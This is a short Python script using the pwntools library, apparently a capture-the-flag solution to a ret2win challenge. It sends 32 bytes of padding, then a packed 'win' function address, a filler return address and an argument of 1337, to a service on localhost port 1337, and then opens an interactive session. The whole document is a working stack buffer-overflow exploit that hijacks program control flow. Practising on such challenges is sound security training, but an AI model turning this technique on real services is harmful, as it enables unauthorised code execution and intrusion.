#!/usr/bin/python


from pwn import *


win_addr=0x080491c6
p=b"a"*32

#conn = process("./challenge")
conn=remote("127.0.0.1",1337)
conn.sendline(p+struct.pack('I', win_addr)+b'r'*4+struct.pack('I', 1337))
#print(conn.recv())
conn.interactive()